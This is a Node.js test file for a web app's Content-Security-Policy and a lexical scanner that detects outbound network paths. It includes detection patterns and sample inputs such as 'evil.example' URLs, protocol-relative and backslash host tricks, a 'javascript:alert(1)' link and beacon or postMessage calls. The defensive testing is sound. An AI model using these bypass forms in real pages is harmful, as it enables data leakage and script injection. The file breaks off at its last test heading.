const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

// R-25・E-14・I-14-01・02: 意図しない外部通信を遮断する CSP と、CSP で制限できない経路を字句で固定する。
// 字句の固定は、アプリ自身のコードが将来この経路を持ち込むことを検出するためのものである。
// 現行コードには禁止する形がないため、照合の関数ごとに違反の試料と除外する形の試料を与えて検出力も確かめる。
// 変異の試料の試験では、写した配信ファイルの場所を KOGAI_CSP_ROOT で渡して、この試験を子プロセスで実行する。
const root = process.env.KOGAI_CSP_ROOT || path.resolve(__dirname, '../..');
const readRaw = file => fs.readFileSync(path.join(root, file), 'utf8');

/**
 * I-14-02: 簡易な字句解析で、js のコメントと正規表現リテラルを空白に置き換える（行の数と文字の位置は保つ）。
 * 文字列とテンプレートの文字は残し、テンプレートの ${…} の中はコードとして扱う。
 */
function stripScriptNoise(code) {
	let out = '';
	let i = 0;
	let last = '';
	const blank = text => text.replace(/[^\n]/g, ' ');
	const regexAllowedAfter = /^(?:|[(,=:[!&|?{};+\-*%<>~^]|return|typeof|case|do|else|in|of|new|delete|void|throw|instanceof|yield|await)$/;
	const templateDepth = [];
	while (i < code.length) {
		const ch = code[i];
		const next = code[i + 1];
		if (ch === '/' && next === '/') {
			const end = code.indexOf('\n', i);
			const stop = end === -1 ? code.length : end;
			out += blank(code.slice(i, stop));
			i = stop;
			continue;
		}
		if (ch === '/' && next === '*') {
			const end = code.indexOf('*/', i + 2);
			const stop = end === -1 ? code.length : end + 2;
			out += blank(code.slice(i, stop));
			i = stop;
			continue;
		}
		if (ch === '"' || ch === "'") {
			let j = i + 1;
			while (j < code.length && code[j] !== ch && code[j] !== '\n') j += code[j] === '\\' ? 2 : 1;
			out += code.slice(i, j + 1);
			i = j + 1;
			last = 'str';
			continue;
		}
		if (ch === '`' || (ch === '}' && templateDepth.length && templateDepth[templateDepth.length - 1] === 0)) {
			if (ch === '}') templateDepth.pop();
			let j = i + 1;
			while (j < code.length && code[j] !== '`' && !(code[j] === '$' && code[j + 1] === '{')) j += code[j] === '\\' ? 2 : 1;
			if (code[j] === '$') { out += code.slice(i, j + 2); i = j + 2; templateDepth.push(0); last = '{'; }
			else { out += code.slice(i, j + 1); i = j + 1; last = 'str'; }
			continue;
		}
		if (ch === '{' && templateDepth.length) templateDepth[templateDepth.length - 1]++;
		if (ch === '}' && templateDepth.length) templateDepth[templateDepth.length - 1]--;
		if (ch === '/' && regexAllowedAfter.test(last)) {
			let j = i + 1;
			let inClass = false;
			while (j < code.length && code[j] !== '\n') {
				if (code[j] === '\\') { j += 2; continue; }
				if (code[j] === '[') inClass = true;
				else if (code[j] === ']') inClass = false;
				else if (code[j] === '/' && !inClass) break;
				j++;
			}
			j++;
			while (/[a-z]/i.test(code[j] || '')) j++;
			// 構文の検査ができるよう、正規表現リテラルは同じ長さの「0 と空白」に置き換える（値として残る）。
			out += '0' + blank(code.slice(i + 1, j));
			i = j;
			last = 'regex';
			continue;
		}
		// 後置・前置の ++・-- は1つの字句とし、その後の / を除算とみなす。
		if ((ch === '+' || ch === '-') && code[i + 1] === ch) {
			out += ch + ch;
			last = ch + ch;
			i += 2;
			continue;
		}
		out += ch;
		if (/\s/.test(ch)) { i++; continue; }
		if (/[\w$]/.test(ch)) {
			let j = i;
			while (j < code.length && /[\w$]/.test(code[j])) j++;
			out += code.slice(i + 1, j);
			last = code.slice(i, j);
			i = j;
			continue;
		}
		last = ch;
		i++;
	}
	return out;
}

/** 照合の対象の内容（js・sw.js はコメントと正規表現リテラル、HTML・CSS はコメントを取り除く）。 */
const blankMarkupComments = (text, pattern) => text.replace(pattern, comment => comment.replace(/[^\n]/g, ' '));
const read = file => {
	const text = readRaw(file);
	if (file.endsWith('.js')) return stripScriptNoise(text);
	if (file.endsWith('.html') || file.endsWith('.svg')) return blankMarkupComments(text, /<!--[\s\S]*?-->/g);
	if (file.endsWith('.css')) return blankMarkupComments(text, /\/\*[\s\S]*?\*\//g);
	return text;
};
const EXPECTED_CSP = "default-src 'none'; script-src 'self'; script-src-attr 'none'; style-src 'self' 'unsafe-inline'; img-src 'self'; connect-src 'self'; manifest-src 'self'; worker-src 'self'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'";
/** I-14-01: 配信するファイルの範囲。 */
const SERVED_ROOT_FILES = ['index.html', 'manifest.json', 'sw.js', 'version.json'];
const SERVED_DIRECTORIES = { css: ['.css'], icons: ['.png', '.svg'], js: ['.js'] };
const NOT_SERVED = new Set(['tests', 'docs', '.github', '.git', 'node_modules', 'package.json', 'package-lock.json', 'README.md', '.editorconfig', '.gitignore']);
// 手元のもの（エディタ・OS・開発支援の設定と一時ファイル）。名前が . か # で始まるもの、~ で終わるもの、Thumbs.db。
// 配信側はこれらを公開しないことを前提とする（E-14-05。Jekyll は . と # で始まるもの・~ で終わるものを既定で外すが、Thumbs.db は外さない）。
const LOCAL_ENTRY = name => /^[.#]|~$/.test(name) || name === 'Thumbs.db';

/** 手元のものだけを含む（または空の）ディレクトリか。 */
function onlyLocalInside(directory) {
	return fs.readdirSync(directory, { withFileTypes: true }).every(entry => LOCAL_ENTRY(entry.name) || (entry.isDirectory() && onlyLocalInside(path.join(directory, entry.name))));
}

/**
 * 直下の項目と、配信するディレクトリの中の項目の一覧。ディレクトリを読み、手元のものと、手元のものだけを含むディレクトリを除く。
 * 通常のファイル以外（ディレクトリ・シンボリックリンクなど）は file: false とする。
 */
function servedListing(base = root) {
	const entries = dir => fs.readdirSync(path.join(base, dir), { withFileTypes: true })
		.filter(entry => !LOCAL_ENTRY(entry.name) && !(entry.isDirectory() && onlyLocalInside(path.join(base, dir, entry.name))))
		.map(entry => ({ name: entry.name, file: entry.isFile() }));
	return {
		rootEntries: entries('').map(entry => entry.name),
		directoryEntries: Object.fromEntries(Object.keys(SERVED_DIRECTORIES).map(dir => [dir, fs.existsSync(path.join(base, dir)) ? entries(dir) : []]))
	};
}

/** 配信するファイル（直下の4ファイルと、配信するディレクトリの一覧のファイル）だけを写す。手元のファイルは写さない。 */
function copyServedFiles(target) {
	const listing = servedListing(root);
	const files = [...SERVED_ROOT_FILES.filter(file => fs.existsSync(path.join(root, file))), ...Object.entries(listing.directoryEntries).flatMap(([dir, entries]) => entries.filter(entry => entry.file).map(entry => `${dir}/${entry.name}`))];
	for (const file of files) {
		fs.mkdirSync(path.dirname(path.join(target, file)), { recursive: true });
		fs.copyFileSync(path.join(root, file), path.join(target, file));
	}
}

// 走査するファイルの一覧は、配信の判定と同じ一覧から作る（手元の一時ファイル・無視したファイルを走査しない）。
const LISTING = servedListing();
const listFiles = (dir, extension) => LISTING.directoryEntries[dir].filter(entry => entry.file && entry.name.endsWith(extension)).map(entry => `${dir}/${entry.name}`).sort();
const jsFiles = listFiles('js', '.js');
const codeFiles = [...jsFiles, 'sw.js'];
const appFiles = ['index.html', 'sw.js', 'manifest.json', 'version.json', ...jsFiles, ...listFiles('css', '.css'), ...listFiles('icons', '.svg')];

function outsideServedScope(rootEntries, directoryEntries) {
	const outside = rootEntries.filter(name => !NOT_SERVED.has(name) && !SERVED_ROOT_FILES.includes(name) && !Object.hasOwn(SERVED_DIRECTORIES, name));
	for (const [dir, extensions] of Object.entries(SERVED_DIRECTORIES)) {
		for (const entry of directoryEntries[dir] || []) if (!entry.file || !extensions.some(extension => entry.name.endsWith(extension))) outside.push(`${dir}/${entry.name}`);
	}
	return outside;
}
// SVG の名前空間 URI は通信先ではない。
const NAMESPACE_URIS = new Set(['http://www.w3.org/2000/svg', 'http://www.w3.org/1999/xlink']);

/** I-14-02 の照合の関数。いずれも文字列を受け取り、一致した部分の一覧を返す。 */
const match = {
	// URL: "スキーム://"（\ を / と同じに扱う）、特別スキームのスラッシュなしの形、プロトコル相対、文字列・属性値・url( の先頭の mailto:・data:・blob:・javascript:。
	url: text => [
		...[...text.matchAll(/(?<![a-z0-9+.-])[a-z][a-z0-9+.-]*:[\\/]{2}[^\s'"`)<>]*/gi)].map(found => found[0]).filter(found => !NAMESPACE_URIS.has(found)),
		...[...text.matchAll(/(?<![a-z0-9+.-])(?:https?|wss?|ftp|file):(?![\\/]{2})(?![\s'"`]|$)[^\s'"`)<>]*/gim)].map(found => found[0]),
		// プロトコル相対: 区切りの直後に / と \ が2つ以上（js のソースでは \ を \\ と書く）続き、その後にホストの文字が続く（ドットの有無を問わない）。
		...[...text.matchAll(/["'`(=,]\s*([\\/]{2,}[^\\/\s'"`,]+)/gi)].map(found => found[1]),
		...[...text.matchAll(/["'`(=]\s*((?:mailto|data|blob|javascript|stuns?|turns?):)(?!["'`])/gi)].map(found => found[1].toLowerCase())
	],
	// API の名前は部分一致で照合し、ベンダー接頭辞の付いた別名も検出する。
	networkApi: text => [...text.matchAll(/XMLHttpRequest|WebSocket|WebTransport|EventSource|sendBeacon|fetchLater|importScripts|SharedWorker|RTCPeerConnection|SpeechRecognition|speechSynthesis|geolocation|PaymentRequest|PresentationRequest|postMessage|BroadcastChannel|MessageChannel|Translator|LanguageDetector|Summarizer|LanguageModel|Writer|Rewriter|Proofreader|\bnew\s+Worker\s*\(/g)].map(found => found[0]),
	// open( の呼出しと、その受け手（window・caches など。添字の形と受け手のない形は「-」）。
	open: text => [...text.matchAll(/(?:\b([\w$]+)\s*\.\s*)?\bopen\s*\(|\[\s*["'`]open["'`]\s*\]\s*\(/g)].map(found => `${found[1] || '-'}.open(`),
	// location への代入・呼出し（属性名・添字の形を問わない）。
	locationOperation: text => [...text.matchAll(/\blocation\s*(?:\.\s*([A-Za-z_$][\w$]*)|\[\s*["'`]?([\w$]*)["'`]?\s*\])\s*(=(?!=)|\()/g)].map(found => `location.${found[1] || `[${found[2]}]`}${found[3]}`),
	// location そのものへの代入（修飾した .location と、局所で宣言されていない location）。局所の名前は許可リストで固定する。
	locationItself: text => text.split('\n').filter(line => /(?<![\w$])(?:(?:window|document|top|self|parent|opener|globalThis)\s*\.\s*)?location\s*=(?!=)/.test(line)).map(line => line.trim()),
	navigationApi: text => [...text.matchAll(/\bnavigation\.navigate\b|\.submit\s*\(|\brequestSubmit\b/g)].map(found => found[0]),
	serviceWorker: text => [...text.matchAll(/\bclients\s*\.\s*(?!claim\b)[A-Za-z_$][\w$]*|\.navigate\s*\(|\bopenWindow\b|\bshowNotification\b|\bpushManager\b|\bbackgroundFetch\b|\bsync\.register\b/g)].map(found => found[0]),
	htmlTag: text => [...text.matchAll(/<\s*(?:a|area|link|meta|base|form|iframe|object|embed|script)(?=[\s>/])/gi)].map(found => found[0]),
	htmlAttribute: text => [...text.matchAll(/(?<![.\w$-])(?:href|rel|ping|action|formaction)\s*=\s*(?:["'`]|\$\{|\\["'])|http-equiv/gi)].map(found => found[0]),
	createElement: text => [...text.matchAll(/createElement\(\s*["'`](?:a|area|link|meta|base|form|iframe|object|embed|script)["'`]/gi)].map(found => found[0]),
	linkAttribute: text => [...text.matchAll(/setAttribute\(\s*["'`](?:href|rel|ping|action|formaction|http-equiv)["'`]|\.(?:rel|ping|action|formAction|httpEquiv)\s*=(?!=)/gi)].map(found => found[0]),
	// URL のホスト・スキームへの代入: プロパティへの代入、添字への代入、オブジェクトのキー（Object.assign などに渡す形）。
	urlPartAssignment: text => [...text.matchAll(/\.\s*(?:host|hostname|protocol|port)\s*=(?!=)|\[\s*["'`](?:host|hostname|protocol|port)["'`]\s*\]\s*=(?!=)|[{,]\s*["'`]?(?:host|hostname|protocol|port)["'`]?\s*:/g)].map(found => found[0].trim()),
	hrefAssignment: text => text.split('\n').filter(line => /\.href\s*=(?!=)/.test(line)).map(line => line.trim()),
	// x-dns-prefetch-control（先読みを止める meta）の名前は資源ヒントではないため、ハイフンを語の一部として扱う。
	resourceHint: text => [...text.matchAll(/(?<![\w-])(?:dns-prefetch|preconnect|prefetch|prerender|preload|modulepreload)(?![\w-])/gi)].map(found => found[0]),
	// スペルチェックと入力の候補表示は、値が false の属性・代入だけを許す（それ以外の値・値なし・属性の操作の API を報告する）。
	// .spellcheck は真偽値の IDL 属性のため、文字列の 'false' は真に変換される。真偽値の false の代入だけを許す。
	inputAssistEnabled: text => [...text.matchAll(/(?<![\w-])(spellcheck|writingsuggestions)(?![\w-])/gi)].filter(found => {
		const rest = text.slice(found.index + found[0].length);
		if (text[found.index - 1] === '.' && found[1].toLowerCase() === 'spellcheck') return !/^\s*=\s*false(?![\w$])/.test(rest);
		return !/^\s*=\s*(["'`]?)false\1(?![\w-])/i.test(rest);
	}).map(found => text.slice(Math.max(0, found.index - 20), found.index + 30).trim())
};

/** 名前による固定: 語としての出現（書き方・大文字小文字を問わない）を行の内容で返す。 */
const nameOccurrences = name => text => text.split('\n').flatMap(line => [...line.matchAll(new RegExp(`(?<![\\w$-])${name.replace('-', '\\-')}(?![\\w$-])`, 'gi'))].map(() => line.trim()));

/** 照合の関数をファイルの一覧に当て、「ファイル 一致」の一覧にする。 */
const scan = (files, matcher) => files.flatMap(file => matcher(read(file)).map(found => `${file} ${found}`)).sort();
const occurrencesOf = (files, name) => scan(files, nameOccurrences(name));

function headTags(html) {
	const head = html.slice(html.indexOf('<head>') + '<head>'.length, html.indexOf('</head>'));
	return [...head.matchAll(/<(meta|link|title|script|style|base)\b[^>]*>/gi)].map(found => found[0]);
}

test('R-25 / I-14-02: every matcher detects its violation samples and ignores the excluded forms', () => {
	const samples = {
		url: {
			hit: ['srcset="a.png 1x, //nasbox/b.png 2x"', "'a.png 1x, //nasbox/b.png 2x'", "'a.png 1x,\\\\\\\\nasbox\\\\b.png 2x'", "'\\\\\\\\fileserver\\\\share\\\\a.png'", "'//nasbox/share/b.png'", "'//2130706433/'", "'//[2001:db8::1]/'", "'/\\\\host.example/x'", "'\\\\\\\\host.example\\\\share\\\\x'", "'///host.example/x'", 'src="/\\host.example/x"', "{ urls: 'stun:127.0.0.1:3478' }", "'turns:relay.example'", 'HTTPS://evil.example/', "'https:\\\\evil.example/'", "'https:evil.example/'", "'/\\evil.example/'", "'//evil.example/'", 'href="javascript:alert(1)"', 'url(data:image/png;base64,AAAA)', "'blob:abc'", 'WSS://evil.example', "'file://host/share/x.png'", "'mailto:x@example.com'"],
			miss: ["'https:'", "'http:'", "'file:'", 'http://www.w3.org/2000/svg', '"Failed to load district file:"', '{ data: 1 }', 'profile: x', 'rows:5',
				// 正規表現リテラルとコメントは、照合の前に字句解析で取り除く（I-14-02）。
				...['value.replace(/\\d+/g, "")', 'text.split(/\\n/g)', '.replace(/\\s+/g, " ")', "s.replace(/\\./g, '')", 'const x = a // see https://x.example', '/* //nasbox/share */ a'].map(stripScriptNoise)]
		},
		networkApi: { hit: ['new WebTransport(u)', 'fetchLater(u)', "new Worker('x.js')", 'navigator.sendBeacon(u)', 'new WebSocket(u)', 'new RTCPeerConnection()', 'new webkitRTCPeerConnection(c)', 'new webkitSpeechRecognition()', 'new SpeechRecognition()', 'speechSynthesis.speak(u)', 'new PaymentRequest(m, d)', 'new PresentationRequest(u)', 'navigator.geolocation.getCurrentPosition(f)', "parent.postMessage(d, '*')", "window.opener.postMessage(d, '*')", "new BroadcastChannel('x').postMessage(d)", 'new MessageChannel()', "Translator.create({ sourceLanguage: 'ja', targetLanguage: 'en' })", 'LanguageDetector.create()', 'Summarizer.create()', 'LanguageModel.create()', 'Writer.create()', 'Rewriter.create()', 'Proofreader.create()'], miss: ["fetch('./version.json')", 'navigator.share(data)', 'Geolocation'] },
		urlPartAssignment: { hit: ["link.hostname = 'x'", "url.host = 'x'", "Object.assign(link, { host: 'x' })", "u.host='x'", "location.protocol = 'http:'", "a['port'] = 1"], miss: ["url.protocol === 'https:'", "location.hostname === 'localhost'", 'const hostName = 1', 'const host = getHost();', "cond ? host : 'x'"] },
		nameHref: { hit: ['Object.assign(a, { href: u })', "setAttributeNS(null, 'href', u)", "a['HREF'] = u", 'a.href = u'], miss: ['data-href-x', 'hrefs'] },
		open: { hit: ["document.open('https://x')", "globalThis.open('x')", "self.open('x')", "top.open('x')", "open('x')", "window['open']('x')"], miss: ['openBrowserHandoff()', 'reopen'] },
		locationOperation: { hit: ["location.host = 'x'", "window.location['href'] = 'x'", "document.location.assign('x')", "location.hostname='x'", 'top.location.protocol = p'], miss: ['const origin = window.location.origin', 'new URL(location.href)', "typeof window.location.replace === 'function'"] },
		locationItself: { hit: ["window.location = 'x'", "top.location='x'", "location = 'x'", 'globalThis.location = u', 'opener.location = u'], miss: ['if (location == x) {}', 'const origin = location.origin;'] },
		navigationApi: { hit: ['navigation.navigate(u)', 'form.requestSubmit()', 'form.submit()'], miss: ['submitButton.disabled = true', 'handleEnableEncryptionSubmit()'] },
		serviceWorker: { hit: ['self.clients.openWindow(u)', 'client.navigate(u)', 'self.clients.matchAll()', "registration.showNotification('x')", 'registration.pushManager.subscribe()'], miss: ['self.clients.claim()'] },
		htmlTag: { hit: ['\'<link rel="preconnect" href="//x.example">\'', '`<A HREF = "HTTPS://x">`', '\'<meta http-equiv="refresh" content="0;url=x">\'', '"<FORM action=x>"', '`<iframe src="x">`', "'<script src=x></script>'"], miss: ["'<abbr>'", "'<div>'", "'<label>'"] },
		htmlAttribute: { hit: [' REL = "preconnect"', 'href="x"', "ping='x'", 'http-equiv', 'action=\\"x\\"', 'href=${url}'], miss: ['a.href = url;', 'const action = run;', 'data-href', 'data-href="x"', 'errEl = document.createElement', 'mapping = {}', 'topBarEl = x'] },
		createElement: { hit: ["createElement('LINK')", 'createElement("iframe")', "createElement('a')"], miss: ["createElement('div')", "createElement('abbr')"] },
		linkAttribute: { hit: ["setAttribute('rel', 'preconnect')", "el.ping = 'x'", 'setAttribute("HREF", x)', "el.httpEquiv = 'refresh'"], miss: ['el.relative = 1', "el.getAttribute('rel')"] },
		hrefAssignment: { hit: ['a.href = url;', 'link.href=u'], miss: ['if (a.href === b) {}'] },
		resourceHint: { hit: ['rel="dns-prefetch"', "'preconnect'", '<link rel=modulepreload>', 'PREFETCH'], miss: ['x-dns-prefetch-control', 'preloaded'] },
		inputAssistEnabled: {
			hit: ['spellcheck="true"', '<input spellcheck>', 'el.spellcheck = true', "SPELLCHECK='TRUE'", "setAttribute('spellcheck', 'true')", "setAttribute('spellcheck', '')", "toggleAttribute('spellcheck')", "document.body.removeAttribute('spellcheck')", "spellcheck='true'", 'spellcheck=true', 'spellcheck="TRUE"', 'spellcheck=""', 'writingsuggestions="true"', "el.writingSuggestions = 'true'", "setAttribute('writingsuggestions', 'false')", "el.spellcheck = 'false'", "document.body.spellcheck = 'false'", 'el.spellcheck = "false"'],
			miss: ['spellcheck="false"', "SPELLCHECK='FALSE'", 'spellcheck=false', 'writingsuggestions="false"', 'el.spellcheck = false', "el.writingSuggestions = 'false'", 'el.writingSuggestions = false']
		}
	};
	match.nameHref = nameOccurrences('href');
	assert.deepEqual(Object.keys(samples).sort(), Object.keys(match).sort(), 'Every matcher has samples');
	for (const [name, { hit, miss }] of Object.entries(samples)) {
		for (const sample of hit) assert.ok(match[name](sample).length > 0, `${name} detects ${sample}`);
		for (const sample of miss) assert.deepEqual(match[name](sample), [], `${name} ignores ${sample}`);
	}
	// 許可リストで区別できるよう、caches.open は受け手付きで、局所の location は行として報告する。
	assert.deepEqual(match.open('caches.open(CACHE_NAME)'), ['caches.open(']);
	assert.deepEqual(match.open("window.open(url, '_blank', 'noopener,noreferrer')"), ['window.open(']);
	assert.deepEqual(match.locationItself("const location = c.location ?? 'x';"), ["const location = c.location ?? 'x';"]);
});

test('R-25 / I-14-02: the lexer removes only comments and regular expression literals', () => {
	assert.equal(stripScriptNoise("s.replace(/\\./g, '') // https://x.example"), "s.replace(0" + ' '.repeat('/\\./g'.length - 1) + ", '') " + ' '.repeat('// https://x.example'.length));
	assert.equal(stripScriptNoise('x = a / b / c; y = (d) / 2;'), 'x = a / b / c; y = (d) / 2;', 'Division is kept');
	// 後置の ++・-- の後の / は除算であり、その後のコードを隠さない。
	assert.equal(stripScriptNoise('const h = n++ / 2; window.open(u); return h; } // half'), 'const h = n++ / 2; window.open(u); return h; } ' + ' '.repeat('// half'.length));
	assert.equal(stripScriptNoise("n-- / 2; const u = 'https://evil.example/x.png'"), "n-- / 2; const u = 'https://evil.example/x.png'");
	assert.deepEqual(match.url(stripScriptNoise("n-- / 2; const u = 'https://evil.example/x.png'")), ['https://evil.example/x.png']);
	assert.equal(stripScriptNoise("`a ${ '<a href=x>' } b`"), "`a ${ '<a href=x>' } b`", 'Template text and expressions are kept');
	assert.equal(stripScriptNoise('/* https://x.example */ a'), ' '.repeat('/* https://x.example */'.length) + ' a');
	assert.equal(stripScriptNoise("'// not a comment' + \"/* nor this */\""), "'// not a comment' + \"/* nor this */\"", 'Strings are kept');
	assert.deepEqual(match.url(stripScriptNoise("s.replace(/\\./g, '') // https://x.example")), [], 'Comments and regular expressions cannot produce URL matches');
	// 現行コードで取り除かれる箇所は、コメントの内側か、コメント・正規表現リテラルの始まりから始まり、
	// 取り除いた後のコードは構文として正しい（除算を正規表現と取り違えると、多くの場合ここで構文の誤りになる）。
	for (const file of codeFiles) {
		const original = readRaw(file).split('\n');
		const stripped = read(file).split('\n');
		assert.equal(stripped.length, original.length, `${file} keeps its lines`);
		assert.doesNotThrow(() => new vm.Script(read(file), { filename: file }), `${file} still parses after the lexer`);
		let inBlock = false;
		original.forEach((line, index) => {
			if (line === stripped[index]) return;
			assert.equal(stripped[index].length, line.length, `${file}:${index + 1} keeps its columns`);
			const first = [...line].findIndex((char, column) => char !== stripped[index][column]);
			const startedInBlock = inBlock;
			if (line.slice(first, first + 2) === '/*') inBlock = !line.slice(first).includes('*/');
			else if (inBlock && line.includes('*/')) inBlock = false;
			assert.ok(startedInBlock || line[first] === '/', `${file}:${index + 1} removes only a comment or a regular expression`);
			assert.ok(startedInBlock || /^[0 ]$/.test(stripped[index][first]), `${file}:${index + 1} replaces it with blanks or a 0 placeholder`);
		});
	}
});

test('R-25 / I-14-01: only the listed files are served, index.html is the only HTML document and every reference stays inside', () => {
	const { rootEntries, directoryEntries: directories } = servedListing();
	assert.deepEqual(outsideServedScope(rootEntries, directories), [], 'Nothing outside the served scope');
	assert.deepEqual(outsideServedScope([...rootEntries, 'help.html'], directories), ['help.html'], 'A new HTML document at the top is detected');
	assert.deepEqual(outsideServedScope(rootEntries, { ...directories, js: [...directories.js, { name: 'vendor.js', file: false }] }), ['js/vendor.js'], 'A new directory under js/ is detected, even when its name ends with .js');
	const served = new Set([...SERVED_ROOT_FILES, ...Object.entries(directories).flatMap(([dir, entries]) => entries.map(entry => `${dir}/${entry.name}`))]);
	assert.deepEqual([...served].filter(file => /\.html?$/i.test(file)), ['index.html'], 'index.html is the only HTML document');
	for (const file of appFiles) assert.ok(served.has(file), `${file} is scanned and served`);
	const assets = [...readRaw('sw.js').match(/const ASSETS = \[([\s\S]*?)\];/)[1].matchAll(/'\.\/([^']*)'/g)].map(found => found[1]).filter(Boolean);
	assert.ok(assets.length > 10);
	for (const asset of assets) assert.ok(served.has(asset), `The service worker asset ${asset} is served and scanned`);
	const references = [...readRaw('index.html').matchAll(/\b(?:src|href)\s*=\s*"([^"#]+)"/gi)].map(found => found[1]);
	for (const reference of references) assert.ok(served.has(reference), `index.html refers only to served files: ${reference}`);
});

test('R-25 / I-14-01: local editor, OS and tool files are ignored while new files are checked', () => {
	const dir = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'kogai-csp-scope-'));
	const put = (file, text = 'x') => { fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true }); fs.writeFileSync(path.join(dir, file), text); };
	try {
		copyServedFiles(dir);
		const control = servedListing(dir);
		assert.deepEqual(outsideServedScope(control.rootEntries, control.directoryEntries), [], 'Control: a copy of the served files is inside');
		// 手元の設定・一時ファイルと、それだけを含む（または空の）ディレクトリは、範囲に数えず走査もしない。
		for (const file of ['.vscode/settings.json', '.claude/settings.local.json', '.DS_Store', 'Thumbs.db', 'js/.DS_Store', 'js/#app.js#', 'js/.#app.js', 'js/.app.js.swp', 'js/app.js~', 'icons/old/.DS_Store', 'icons/a/b/.DS_Store']) put(file);
		fs.mkdirSync(path.join(dir, 'css/new'));
		const quiet = servedListing(dir);
		assert.deepEqual(outsideServedScope(quiet.rootEntries, quiet.directoryEntries), [], 'Local files are not reported');
		assert.deepEqual(quiet.directoryEntries, control.directoryEntries, 'Local files are not scanned');
		// 新しいファイル・ディレクトリは、日本語の名前を含めて報告する。
		put('help.html', '<p>help</p>');
		put('ヘルプ.html', '<p>ヘルプ</p>');
		put('js/vendor/a.js', '');
		put('icons/old/legacy.html', '<p>old</p>');
		// 親が別のディレクトリだけを含む入れ子の形も、中に手元でないものがあれば報告する。
		put('vendor/lib/help.html', '<p>vendor</p>');
		put('css/theme/dark/x.css', '');
		// 配信する拡張子で終わる名前のディレクトリも、ファイルではないため報告する。
		put('icons/set.png/help.html', '<p>set</p>');
		put('js/lib.js/a.js', '');
		// 手元のものの規則の境界: 途中に ~・# を含むもの、_ で始まるものは手元のものではない。
		put('help~old.html', '<p>old</p>');
		put('a#b.html', '<p>a</p>');
		put('_help.html', '<p>help</p>');
		put('js/_x.js', '');
		// 配信するディレクトリの直下の、拡張子の違う通常のファイルも報告する（拡張子はディレクトリごと）。
		for (const file of ['js/app.js.map', 'js/help.html', 'css/font.woff2', 'icons/photo.jpg', 'icons/x.js']) put(file);
		const changed = servedListing(dir);
		assert.deepEqual(outsideServedScope(changed.rootEntries, changed.directoryEntries).sort(), ['_help.html', 'a#b.html', 'css/font.woff2', 'css/theme', 'help.html', 'help~old.html', 'icons/old', 'icons/photo.jpg', 'icons/set.png', 'icons/x.js', 'js/app.js.map', 'js/help.html', 'js/lib.js', 'js/vendor', 'vendor', 'ヘルプ.html'].sort());
		assert.ok(changed.directoryEntries.js.some(entry => entry.name === '_x.js' && entry.file), 'js/_x.js is served and scanned');
	} finally {
		fs.rmSync(dir, { recursive: true, force: true });
	}
});

test('R-25 / I-14-01: the CSP is the first element after the charset, followed by the referrer and DNS prefetch controls', () => {
	const html = read('index.html');
	const tags = headTags(html);
	assert.equal(tags[0], '<meta charset="UTF-8">');
	assert.equal(tags[1], `<meta http-equiv="Content-Security-Policy" content="${EXPECTED_CSP}">`, 'The CSP precedes every element that can request a resource');
	assert.equal(tags[2], '<meta name="referrer" content="no-referrer">');
	assert.equal(tags[3], '<meta http-equiv="x-dns-prefetch-control" content="off">');
	assert.equal(tags.filter(tag => /http-equiv="Content-Security-Policy"/i.test(tag)).length, 1, 'Exactly one policy');
	assert.ok(tags.findIndex(tag => /^<(link|script|style|base)\b/i.test(tag)) > 3, 'No resource element before the CSP and its companions');
	const httpEquivValues = text => [...text.matchAll(/http-equiv\s*=\s*(["']?)([^"'\s>]*)\1/gi)].map(found => found[2].toLowerCase());
	assert.deepEqual(httpEquivValues(html), ['content-security-policy', 'x-dns-prefetch-control'], 'No meta refresh or other http-equiv');
	for (const sample of ["<meta http-equiv='refresh' content='600'>", '<meta http-equiv=refresh content=600>', '<META HTTP-EQUIV = "Refresh" content="0">']) assert.deepEqual(httpEquivValues(sample), ['refresh'], `The http-equiv check sees ${sample}`);
	assert.doesNotMatch(html, /<\s*base\b/i, 'No base element');
});

test('R-25 / E-14-01: the policy denies by default and allows only the own origin for the kinds the application needs', () => {
	const directives = new Map(EXPECTED_CSP.split(';').map(part => part.trim().split(/\s+/)).map(([name, ...sources]) => [name, sources]));
	for (const name of ['default-src', 'frame-src', 'object-src', 'base-uri', 'form-action', 'script-src-attr']) assert.deepEqual(directives.get(name), ["'none'"], name);
	for (const name of ['script-src', 'img-src', 'connect-src', 'manifest-src', 'worker-src']) assert.deepEqual(directives.get(name), ["'self'"], name);
	// 'unsafe-inline' は style 属性と印刷の向きの <style> 要素に必要なため、style-src（要素と属性の両方）に置く。
	assert.deepEqual(directives.get('style-src'), ["'self'", "'unsafe-inline'"]);
	for (const [name, sources] of directives) {
		for (const source of sources) assert.ok(["'self'", "'none'", "'unsafe-inline'"].includes(source), `${name} allows no host, scheme or data: (${source})`);
	}
	for (const name of ['font-src', 'media-src', 'child-src', 'prefetch-src', 'style-src-attr', 'style-src-elem', 'report-uri', 'report-to']) assert.equal(directives.has(name), false, `${name} falls back or is not used`);
});

test('R-25 / I-14-02: application files contain no URL except the explicit share destinations', () => {
	assert.deepEqual(scan(appFiles, match.url), [
		'js/district.js https://line.me/R/msg/text/?',
		'js/district.js https://line.me/R/msg/text/?',
		'js/district.js mailto:',
		'js/district.js mailto:',
		'js/rep.js https://line.me/R/msg/text/?',
		'js/rep.js mailto:'
	], 'Only the LINE and mail share destinations are URLs');
	const manifest = JSON.parse(read('manifest.json'));
	for (const url of [manifest.start_url, manifest.scope, ...manifest.icons.map(icon => icon.src)]) {
		assert.doesNotMatch(url, /^[a-z][a-z0-9+.-]*:|^[\\/]{2}/i, `The manifest URL ${url} is relative`);
	}
});

test('R-25 / I-14-02: network APIs are limited to the same-origin version check and the service worker', () => {
	assert.deepEqual(scan(codeFiles, match.networkApi), [], 'No other network API');
	const fetches = codeFiles.flatMap(file => [...read(file).matchAll(/\bfetch\s*\(([^,)]*)/g)].map(found => `${file} ${found[1].trim()}`));
	assert.deepEqual(fetches.sort(), [
		"js/app.js './version.json?_t=' + Date.now(",
		'sw.js event.request',
		'sw.js request',
		'sw.js request'
	], 'fetch is used only for the version check and the service worker assets');
	const registrations = jsFiles.flatMap(file => [...read(file).matchAll(/serviceWorker\.register\(([^,)]*)/g)].map(found => found[1].trim()));
	assert.deepEqual(registrations, ["'./sw.js'"]);
	assert.deepEqual(scan(codeFiles, match.serviceWorker), [], 'The service worker only claims its clients');
	assert.match(read('sw.js'), /self\.clients\.claim\(\)/);
});

test('R-25 / I-14-02: page navigation is limited to the shares, the update reload and the reload after clearing', () => {
